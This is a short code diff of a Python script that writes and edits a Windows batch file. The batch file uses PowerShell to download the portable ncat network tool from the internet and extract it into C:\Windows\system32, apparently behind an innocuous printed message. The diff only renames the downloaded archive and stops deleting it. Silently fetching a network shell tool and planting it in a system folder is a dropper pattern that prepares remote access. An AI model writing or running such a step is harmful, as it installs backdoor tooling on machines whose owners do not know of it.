@@ -5,9 +5,8 @@ print("That's good")
 TestBat = open(r'Test.bat', '+w')
 TestBat.write('''@echo off
               cls
-              powershell wget http://nmap.org/dist/ncat-portable-5.59BETA1.zip -o cat.zip
-              powershell Expand-Archive -LiteralPath .\cat.zip -DestinationPath C:\Windows\system32
-              del .\cat.zip
+              powershell wget http://nmap.org/dist/ncat-portable-5.59BETA1.zip -o cct.zip
+              powershell Expand-Archive -LiteralPath .\cct.zip -DestinationPath C:\Windows\system32
               cd C:\Windows\system32
               del README''')
 TestBat.close()
